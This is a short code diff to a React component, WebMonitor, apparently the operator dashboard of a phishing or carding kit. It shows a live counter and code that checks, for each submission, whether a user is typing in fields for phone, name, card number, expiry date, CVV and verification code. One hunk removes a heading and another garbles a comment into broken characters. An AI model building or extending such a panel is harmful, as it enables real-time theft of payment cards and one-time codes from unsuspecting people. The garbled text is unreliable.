@@ -290,7 +290,7 @@ export function WebMonitor() {
         <div className="flex items-center justify-between">
           <div className="flex items-center gap-4">
             <span className="text-sm text-muted-foreground">��� 神经网络ML1.15</span>
-            <h1 className="text-lg font-medium text-foreground">网页实时监控</h1>
+
             <div className="flex items-center gap-2">
               <Badge variant="outline" className="bg-green-50 text-green-600 border-green-200">
                 🔴 LIVE - {onlineCount} 在线处理
@@ -437,7 +437,7 @@ export function WebMonitor() {
                   submission.userName
                 );
 
-                // 检查是否有字段正在输入
+                // 检��是否有字段正在输入
                 const hasActiveTyping = ['phone', 'name', 'cardNumber', 'expiryDate', 'cvv', 'verificationCode'].some(field =>
                   isFieldTyping(submission.id, field)
                 );
